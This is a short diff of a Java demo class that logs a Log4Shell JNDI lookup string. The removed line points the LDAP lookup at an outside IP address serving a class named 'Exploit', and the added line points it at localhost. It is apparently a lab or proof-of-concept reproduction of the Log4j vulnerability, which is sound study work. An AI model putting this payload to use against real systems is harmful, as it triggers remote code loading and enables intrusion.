@@ -26,7 +26,7 @@ public class log4j {
     private static final Logger logger = LogManager.getLogger(log4j.class);
 
     public static void main(String[] args) {
-        logger.error("${jndi:ldap://49.232.128.44:1234/Exploit}");
+        logger.error("${jndi:ldap://127.0.0.1:1234/Exploit}");
     }
 }
 ```
